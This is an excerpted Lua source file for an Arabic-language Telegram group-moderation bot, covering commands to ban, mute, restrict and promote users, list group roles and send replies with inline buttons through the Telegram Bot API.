DevRio:sadd(Matrx..'Rio:Admins:'..msg.chat_id_,user)
...
DevRio:srem(Matrx..'Rio:Admins:'..msg.chat_id_,user)
...
DevRio:sadd(Matrx..'Rio:VipMem:'..msg.chat_id_,user)
...
DevRio:srem(Matrx..'Rio:VipMem:'..msg.chat_id_,user)
...
MatrxTeam = {"ها هلاو","انطق","كول","تفضل","احبك","عمري","لاف"};
...
DevRio:del(Matrx.."Rio:Lock:ProSet"..msg.chat_id_)
...
DevRio:set(Matrx.."Rio:Lock:ProSet"..msg.chat_id_,"true")
...
if not RioConstructor(msg) and DevRio:get(Matrx.."Rio:Lock:KickBan"..msg.chat_id_) then 
...
keyboard = {} 
keyboard.inline_keyboard = {{{text="• الغاء حظر •",callback_data=msg.sender_user_id_..":UnBan:"..result.sender_user_id_}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end,nil)
end
...
ChatKick(result.chat_id_, result.sender_user_id_)
DevRio:sadd(Matrx..'Rio:Ban:'..msg.chat_id_, result.sender_user_id_)
...
if not Constructor(msg) and DevRio:get(Matrx.."Rio:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'᥀︙لقد تم تعطيل الطرد والحظر من قبل مالك المجموعه')
return false
end
if result.id_ then
...
ChatKick(msg.chat_id_, result.id_)
DevRio:sadd(Matrx..'Rio:Ban:'..msg.chat_id_, result.id_)
...
ChatKick(msg.chat_id_, user)
DevRio:sadd(Matrx..'Rio:Ban:'..msg.chat_id_, user)
...
DevRio:srem(Matrx..'Rio:Ban:'..msg.chat_id_, result.sender_user_id_)
...
if result.id_ then
DevRio:srem(Matrx..'Rio:Ban:'..msg.chat_id_, result.id_)
...
DevRio:srem(Matrx..'Rio:Ban:'..msg.chat_id_, user)
...
if not RioConstructor(msg) and DevRio:get(Matrx.."Rio:Lock:MuteTked"..msg.chat_id_) then 
...
if DevRio:sismember(Matrx..'Rio:Muted:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙هو بالفعل مكتوم من المجموعه")  
else
DevRio:sadd(Matrx..'Rio:Muted:'..msg.chat_id_, result.sender_user_id_)
text = "᥀︙تم كتمه من المجموعه" 
keyboard = {} 
keyboard.inline_keyboard = {{{text="• الغاء كتم •",callback_data=msg.sender_user_id_..":UnMute:"..result.sender_user_id_}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
end
...
if DevRio:sismember(Matrx..'Rio:Muted:'..msg.chat_id_, result.id_) then
ReplyStatus(msg,result.id_,"Reply","᥀︙هو بالفعل مكتوم من المجموعه")  
else
DevRio:sadd(Matrx..'Rio:Muted:'..msg.chat_id_, result.id_)
...
if DevRio:sismember(Matrx..'Rio:Muted:'..msg.chat_id_, user) then
ReplyStatus(msg,user,"Reply","᥀︙هو بالفعل مكتوم من المجموعه")  
else
DevRio:sadd(Matrx..'Rio:Muted:'..msg.chat_id_, user)
...
if not DevRio:sismember(Matrx..'Rio:Muted:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙هو ليس مكتوم لالغاء كتمه")  
else
DevRio:srem(Matrx..'Rio:Muted:'..msg.chat_id_, result.sender_user_id_)
...
if result.id_ then
if not DevRio:sismember(Matrx..'Rio:Muted:'..msg.chat_id_, result.id_) then
ReplyStatus(msg,result.id_,"Reply","᥀︙هو ليس مكتوم لالغاء كتمه")  
else
DevRio:srem(Matrx..'Rio:Muted:'..msg.chat_id_, result.id_)
...
if not DevRio:sismember(Matrx..'Rio:Muted:'..msg.chat_id_, user) then
ReplyStatus(msg,user,"Reply","᥀︙هو ليس مكتوم لالغاء كتمه")  
else
DevRio:srem(Matrx..'Rio:Muted:'..msg.chat_id_, user)
...
DevRio:sadd(Matrx..'Rio:Tkeed:'..msg.chat_id_, result.sender_user_id_)
text = "᥀︙تم تقيده من المجموعه" 
keyboard = {} 
keyboard.inline_keyboard = {{{text="• الغاء تقيد •",callback_data=msg.sender_user_id_..":UnTkeed:"..result.sender_user_id_}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
end 
...
DevRio:sadd(Matrx..'Rio:Tkeed:'..msg.chat_id_, result.id_)
...
DevRio:sadd(Matrx..'Rio:Tkeed:'..msg.chat_id_, user)
...
DevRio:srem(Matrx..'Rio:Tkeed:'..msg.chat_id_, result.sender_user_id_)
...
DevRio:srem(Matrx..'Rio:Tkeed:'..msg.chat_id_, result.id_)
...
DevRio:srem(Matrx..'Rio:Tkeed:'..msg.chat_id_, user)
...
if DevRio:sismember(Matrx..'Rio:RioSudo:',result.sender_user_id_) and not Sudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
return false 
end
if DevRio:sismember(Matrx..'Rio:SecondSudo:',result.sender_user_id_) and not RioSudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع حظر المطور الاساسي²*", 1, 'md')
return false 
end
ChatKick(result.chat_id_, result.sender_user_id_)
DevRio:sadd(Matrx..'Rio:BanAll:', result.sender_user_id_)
text = "᥀︙تم حظره عام من المجموعات" 
keyboard = {} 
keyboard.inline_keyboard = {{{text="• الغاء العام •",callback_data=msg.sender_user_id_..":UnAll:"..result.sender_user_id_},{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..msg.sender_user_id_}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
...
if DevRio:sismember(Matrx..'Rio:RioSudo:',result.id_) and not Sudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
return false 
end
if DevRio:sismember(Matrx..'Rio:SecondSudo:',result.id_) and not RioSudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع حظر المطور الاساسي²*", 1, 'md')
return false 
end
if result.id_ then
ChatKick(msg.chat_id_, result.id_)
DevRio:sadd(Matrx..'Rio:BanAll:', result.id_)
...
if DevRio:sismember(Matrx..'Rio:RioSudo:',user) and not Sudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
return false 
end
if DevRio:sismember(Matrx..'Rio:SecondSudo:',user) and not RioSudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع حظر المطور الاساسي²*", 1, 'md')
return false 
end
ChatKick(msg.chat_id_, user)
DevRio:sadd(Matrx..'Rio:BanAll:', user)
...
DevRio:sadd(Matrx..'Rio:MuteAll:', result.sender_user_id_)          
...
if result.id_ then
DevRio:sadd(Matrx..'Rio:MuteAll:', result.id_)
...
DevRio:sadd(Matrx..'Rio:MuteAll:', user)
...
DevRio:srem(Matrx..'Rio:BanAll:', result.sender_user_id_)
DevRio:srem(Matrx..'Rio:MuteAll:', result.sender_user_id_)
...
if result.id_ then
DevRio:srem(Matrx..'Rio:BanAll:', result.id_)
DevRio:srem(Matrx..'Rio:MuteAll:', result.id_)
...
DevRio:srem(Matrx..'Rio:BanAll:', user)
DevRio:srem(Matrx..'Rio:MuteAll:', user)
...
DevRio:setex(Matrx.."Rio:EditDev"..msg.sender_user_id_,300,true)
end
if DevRio:get(Matrx.."Rio:EditDev"..msg.sender_user_id_) then
if text and text:match("^الغاء$") then 
send(msg.chat_id_, msg.id_,'᥀︙تم الغاء امر تغير المطور الاساسي')
DevRio:del(Matrx.."Rio:EditDev"..msg.sender_user_id_)
return false
end
if text and text:match("^(%d+)$") then 
...
if dp.first_name_ ~= false then
DevRio:del(Matrx.."Rio:EditDev"..msg.sender_user_id_)
DevRio:set(Matrx.."Rio:NewDev"..msg.sender_user_id_,dp.id_)
...
--     Source Matrx     --
if msg.reply_to_message_id_ ~= 0 then
if text and text:match("^رفع مطي$") and not DevRio:get(Matrx..'Rio:Lock:Stupid'..msg.chat_id_) and ChCheck(msg) then
function donky_by_reply(extra, result, success)
if DevRio:sismember(Matrx..'User:Donky:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙هو مطي شرفع منه بعد😹💔") 
else
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم رفعه في قائمة المطايه") 
DevRio:sadd(Matrx..'User:Donky:'..msg.chat_id_, result.sender_user_id_)
end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,donky_by_reply)
end end
--     Source Matrx     --
if msg.reply_to_message_id_ ~= 0  then
if text and text:match("^تنزيل مطي$") and not DevRio:get(Matrx..'Rio:Lock:Stupid'..msg.chat_id_) and ChCheck(msg) then
function donky_by_reply(extra, result, success)
if not DevRio:sismember(Matrx..'User:Donky:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙هو ليس مطي ليتم تنزيله") 
else
DevRio:srem(Matrx..'User:Donky:'..msg.chat_id_, result.sender_user_id_)
...
DevRio:set('MatrxTeam:'..Matrx..'id:user'..msg.chat_id_,TXT)  
DevRio:setex('MatrxTeam:'..Matrx.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_, 300, true)  
...
DevRio:del(Matrx..'Rio:UsersMsgs'..msg.chat_id_..':'..result.sender_user_id_) 
DevRio:incrby(Matrx..'Rio:UsersMsgs'..msg.chat_id_..':'..result.sender_user_id_,Num) 
...
DevRio:set('MatrxTeam:'..Matrx..'ids:user'..msg.chat_id_,TXT)  
DevRio:setex('MatrxTeam:'..Matrx.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_, 300, true)  
...
function Reply(extra, result, success)
DevRio:incrby(Matrx..'Rio:GamesNumber'..msg.chat_id_..result.sender_user_id_,Num) 
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم اضافة "..Num..' نقطه', 1, 'md') 
end
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},Reply, nil)
return false
end
if DevRio:get(Matrx..'Rio:Lock:Clean'..msg.chat_id_) then if msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.photo_ or msg.content_.animation_ or msg.content_.animated_ then if msg.reply_to_message_id_ ~= 0 then DevRio:sadd(Matrx.."Rio:cleaner"..msg.chat_id_, msg.id_) else DevRio:sadd(Matrx.."Rio:cleaner"..msg.chat_id_, msg.id_) end end end
if DevRio:get(Matrx..'Rio:Lock:CleanNum'..msg.chat_id_) then if msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.photo_ or msg.content_.animation_ or msg.content_.animated_ then if msg.reply_to_message_id_ ~= 0 then DevRio:sadd(Matrx.."Rio:cleanernum"..msg.chat_id_, msg.id_) else DevRio:sadd(Matrx.."Rio:cleanernum"..msg.chat_id_, msg.id_) end end end
if DevRio:get(Matrx..'Rio:Lock:CleanMusic'..msg.chat_id_) then if msg.content_.voice_ or msg.content_.audio_ then if msg.reply_to_message_id_ ~= 0 then DevRio:sadd(Matrx.."Rio:cleanermusic"..msg.chat_id_, msg.id_) else DevRio:sadd(Matrx.."Rio:cleanermusic"..msg.chat_id_, msg.id_) end end end
if Manager(msg) and msg.reply_to_message_id_ ~= 0 then
if text and text:match("^تثبيت$") and ChCheck(msg) then 
if DevRio:sismember(Matrx.."Rio:Lock:Pinpin",msg.chat_id_) and not BasicConstructor(msg) then
...
if data.ID == "Ok" then
DevRio:set(Matrx..'Rio:PinnedMsg'..msg.chat_id_,msg.reply_to_message_id_)
...
local List = DevRio:smembers(Matrx..'Rio:VipMem:'..msg.chat_id_)
text = "᥀︙قائمة المميزين ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevRio:get(Matrx..'Save:UserName'..v)
if username then
...
keyboard = {} 
keyboard.inline_keyboard = {{{text="• مسح المميزين •",callback_data="/DelVipMem:"..msg.sender_user_id_}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end end
--     Source Matrx     --
...
local List = DevRio:smembers(Matrx..rio)
text = "᥀︙قائمة الادمنيه ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevRio:get(Matrx..'Save:UserName'..v)
if username then
...
keyboard = {} 
keyboard.inline_keyboard = {{{text="• مسح الادمنيه •",callback_data="/DelAdmins:"..msg.sender_user_id_}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end end
--     Source Matrx     -- 
...
local List = DevRio:smembers(Matrx..'Rio:Managers:'..msg.chat_id_)
text = "᥀︙قائمة المدراء ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevRio:get(Matrx..'Save:UserName'..v)
if username then
...
keyboard = {} 
keyboard.inline_keyboard = {{{text="• مسح المدراء •",callback_data="/DelManagers:"..msg.sender_user_id_}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end 
if text == "المنظفين" and ChCheck(msg) then 
local List = DevRio:smembers(Matrx..'Rio:Cleaner:'..msg.chat_id_)
text = "᥀︙قائمة المنظفين ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevRio:get(Matrx..'Save:UserName'..v)
if username then
...
keyboard = {} 
keyboard.inline_keyboard = {{{text="• مسح المنظفين •",callback_data="/DelCleanr:"..msg.sender_user_id_}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end end
--     Source Matrx     --
...
local List = DevRio:smembers(Matrx..'Rio:Constructor:'..msg.chat_id_)
text = "᥀︙قائمة المنشئين ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevRio:get(Matrx..'Save:UserName'..v)
if username then
...
keyboard = {} 
keyboard.inline_keyboard = {{{text="• مسح المنشئين •",callback_data="/DelConstructor:"..msg.sender_user_id_}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end end
--     Source Matrx     --
...
local List = DevRio:smembers(Matrx..'Rio:Owner:'..msg.chat_id_)
text = "᥀︙قائمة المالكين ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevRio:get(Matrx..'Save:UserName'..v)
if username then
...
keyboard = {} 
keyboard.inline_keyboard = {{{text="• مسح المالكين •",callback_data="/DelOwner:"..msg.sender_user_id_}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == "المنشئين الاساسيين" and ChCheck(msg) or text == "منشئين اساسيين" and ChCheck(msg) or text == "المنشئين الاساسين" and ChCheck(msg) then 
local List = DevRio:smembers(Matrx..'Rio:BasicConstructor:'..msg.chat_id_)
...
keyboard = {} 
keyboard.inline_keyboard = {{{text = ''..dp.first_name_..' ',url="t.me/"..dp.username_ or FZOFZ}}}
...
local List = DevRio:smembers(Matrx..'Rio:Muted:'..msg.chat_id_)
...
keyboard = {} 
keyboard.inline_keyboard = {{{text="• مسح المكتومين •",callback_data="/DelMute:"..msg.sender_user_id_}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
--     Source Matrx     --
if text == "المقيدين" and ChCheck(msg) then 
local List = DevRio:smembers(Matrx..'Rio:Tkeed:'..msg.chat_id_)
text = "᥀︙قائمة المقيدين ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevRio:get(Matrx..'Save:UserName'..v)
if username then
...
keyboard = {} 
keyboard.inline_keyboard = {{{text="• مسح المقيدين •",callback_data="/DelKeed:"..msg.sender_user_id_}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
--     Source Matrx     --
if text == "المحظورين" and ChCheck(msg) or text == "المحضورين" and ChCheck(msg) then 
local List = DevRio:smembers(Matrx..'Rio:Ban:'..msg.chat_id_)
...
keyboard = {} 
keyboard.inline_keyboard = {{{text="• مسح المحظورين •",callback_data="/DelBan:"..msg.sender_user_id_}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
--     Source Matrx     --
if text == "المطايه" and ChCheck(msg) or text == "المطاية" and ChCheck(msg) then
local List = DevRio:smembers(Matrx..'User:Donky:'..msg.chat_id_)
...
local List = DevRio:hkeys(Matrx..'Rio:Filters:'..msg.chat_id_)
text = "᥀︙قائمة المنع ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k, v in pairs(List) do
text = text..k..'~ ❨ '..v..' ❩\n'
end
...
local List = DevRio:smembers(Matrx..'Rio:RioSudo:')
...
keyboard = {} 
keyboard.inline_keyboard = {{{text="• مسح الاساسيين •",callback_data="/DelRioSudo:"..msg.sender_user_id_}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end 
--     Source Matrx     --
...
local List = DevRio:smembers(Matrx..'Rio:SecondSudo:')
...
keyboard = {} 
keyboard.inline_keyboard = {{{text="• مسح الثانويين •",callback_data="/DelSecondSudo:"..msg.sender_user_id_}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
--     Source Matrx     --
...
local BanAll = DevRio:smembers(Matrx..'Rio:BanAll:')
local MuteAll = DevRio:smembers(Matrx..'Rio:MuteAll:')
if #BanAll ~= 0 then 
...
keyboard = {} 
keyboard.inline_keyboard = {{{text="• مسح قائمه العام •",callback_data="/DelListAll:"..msg.sender_user_id_}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end 
--     Source Matrx     --
if text == "المطورين" and ChCheck(msg) or text == "↫ المطورين ᥀" and ChCheck(msg) then 
local List = DevRio:smembers(Matrx..'Rio:SudoBot:')
text = "᥀︙قائمة المطورين ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local sudouser = DevRio:get(Matrx..'Rio:Sudos'..v) 
local username = DevRio:get(Matrx..'Save:UserName'..v)
if username then
...
keyboard = {} 
keyboard.inline_keyboard = {{{text="• مسح المطورين •",callback_data="/DelSudoBot:"..msg.sender_user_id_}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
--     Source Matrx     --
...
DevRio:sadd(Matrx.."Rio:RioConstructor:"..msg.chat_id_,dp.id_)
end,nil)   
end,nil)   
end
end 
...
if result.content_.sticker_ then
local idsticker = result.content_.sticker_.sticker_.persistent_id_
DevRio:srem(Matrx.."Rio:FilterSteckr"..msg.chat_id_,idsticker)
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء منع الملصق يمكنهم ارساله الان', 1, 'md')
return false
end
if result.content_.ID == "MessagePhoto" then
local photo = result.content_.photo_.id_
DevRio:srem(Matrx.."Rio:FilterPhoto"..msg.chat_id_,photo)
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء منع الصوره يمكنهم ارسالها الان', 1, 'md')
return false
end
if result.content_.animation_.animation_ then
local idanimation = result.content_.animation_.animation_.persistent_id_
DevRio:srem(Matrx.."Rio:FilterAnimation"..msg.chat_id_,idanimation)
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Matrx..'Rio:Thwel:Rio'..msg.chat_id_) 
end
if text and (text == "تعطيل تحويل الصيغ" or text == "تعطيل التحويل") and Manager(msg) and ChCheck(msg) then
local MatrxTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل تحويل الصيغ'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Matrx..'Rio:Thwel:Rio'..msg.chat_id_,true)  
end
if text == 'تحويل' and not DevRio:get(Matrx..'Rio:Thwel:Rio'..msg.chat_id_) then  
if tonumber(msg.reply_to_message_id_) > 0 then 
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local user_msgs = DevRio:get(Matrx..'Rio:UsersMsgs'..msg.chat_id_..':'..data.id_) or 0
local user_nkt = tonumber(DevRio:get(Matrx..'Rio:GamesNumber'..msg.chat_id_..data.id_) or 0)
if DevRio:sismember(Matrx..'Rio:BanAll:',result.sender_user_id_) then
Tkeed = 'محظور عام'
elseif DevRio:sismember(Matrx..'Rio:MuteAll:',result.sender_user_id_) then
Tkeed = 'مكتوم عام'
elseif DevRio:sismember(Matrx..'Rio:Ban:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'محظور'
elseif DevRio:sismember(Matrx..'Rio:Muted:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'مكتوم'
elseif DevRio:sismember(Matrx..'Rio:Tkeed:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'مقيد'
else
Tkeed = false
end
...
if DevRio:sismember(Matrx..'Rio:SudoBot:',result.sender_user_id_) and SudoBot(msg) then
sudobot = '\n᥀︙عدد الكروبات ↫ '..(DevRio:get(Matrx..'Rio:Sudos'..result.sender_user_id_) or 0)..'' 
else 
sudobot = '' 
end
...
local user_msgs = DevRio:get(Matrx..'Rio:UsersMsgs'..msg.chat_id_..':'..res.id_) or 0
local user_nkt = tonumber(DevRio:get(Matrx..'Rio:GamesNumber'..msg.chat_id_..res.id_) or 0)
if DevRio:sismember(Matrx..'Rio:BanAll:',res.id_) then
Tkeed = 'محظور عام'
elseif DevRio:sismember(Matrx..'Rio:MuteAll:',res.id_) then
Tkeed = 'مكتوم عام'
elseif DevRio:sismember(Matrx..'Rio:Ban:'..msg.chat_id_,res.id_) then
Tkeed = 'محظور'
elseif DevRio:sismember(Matrx..'Rio:Muted:'..msg.chat_id_,res.id_) then
Tkeed = 'مكتوم'
elseif DevRio:sismember(Matrx..'Rio:Tkeed:'..msg.chat_id_,res.id_) then
Tkeed = 'مقيد'
else
Tkeed = false
end
...
if DevRio:sismember(Matrx..'Rio:SudoBot:',res.id_) and SudoBot(msg) then
sudobot = '\n᥀︙عدد الكروبات ↫ '..(DevRio:get(Matrx..'Rio:Sudos'..res.id_) or 0)..'' 
else 
sudobot = '' 
end
...
local user_msgs = DevRio:get(Matrx..'Rio:UsersMsgs'..msg.chat_id_..':'..iduser) or 0
local user_nkt = tonumber(DevRio:get(Matrx..'Rio:GamesNumber'..msg.chat_id_..iduser) or 0)
if DevRio:sismember(Matrx..'Rio:BanAll:',iduser) then
Tkeed = 'محظور عام'
elseif DevRio:sismember(Matrx..'Rio:MuteAll:',iduser) then
Tkeed = 'مكتوم عام'
elseif DevRio:sismember(Matrx..'Rio:Ban:'..msg.chat_id_,iduser) then
Tkeed = 'محظور'
elseif DevRio:sismember(Matrx..'Rio:Muted:'..msg.chat_id_,iduser) then
Tkeed = 'مكتوم'
elseif DevRio:sismember(Matrx..'Rio:Tkeed:'..msg.chat_id_,iduser) then
Tkeed = 'مقيد'
else
Tkeed = false
end
...
if DevRio:sismember(Matrx..'Rio:SudoBot:',iduser) and SudoBot(msg) then
sudobot = '\n᥀︙عدد الكروبات ↫ '..(DevRio:get(Matrx..'Rio:Sudos'..iduser) or 0)..'' 
else 
sudobot = '' 
end
...
if DevRio:sismember(Matrx..'Rio:Muted:'..msg.chat_id_,result.sender_user_id_) then muted = 'مكتوم' else muted = 'غير مكتوم' end
if DevRio:sismember(Matrx..'Rio:Ban:'..msg.chat_id_,result.sender_user_id_) then banned = 'محظور' else banned = 'غير محظور' end
if DevRio:sismember(Matrx..'Rio:BanAll:',result.sender_user_id_) then banall = 'محظور عام' else banall = 'غير محظور عام' end
if DevRio:sismember(Matrx..'Rio:MuteAll:',result.sender_user_id_) then muteall = 'مكتوم عام' else muteall = 'غير مكتوم عام' end
if DevRio:sismember(Matrx..'Rio:Tkeed:',result.sender_user_id_) then tkeed = 'مقيد' else tkeed = 'غير مقيد' end
...
if result.id_ then
if DevRio:sismember(Matrx..'Rio:Muted:'..msg.chat_id_,result.id_) then muted = 'مكتوم' else muted = 'غير مكتوم' end
if DevRio:sismember(Matrx..'Rio:Ban:'..msg.chat_id_,result.id_) then banned = 'محظور' else banned = 'غير محظور' end
if DevRio:sismember(Matrx..'Rio:BanAll:',result.id_) then banall = 'محظور عام' else banall = 'غير محظور عام' end
if DevRio:sismember(Matrx..'Rio:MuteAll:',result.id_) then muteall = 'مكتوم عام' else muteall = 'غير مكتوم عام' end
if DevRio:sismember(Matrx..'Rio:Tkeed:',result.id_) then tkeed = 'مقيد' else tkeed = 'غير مقيد' end
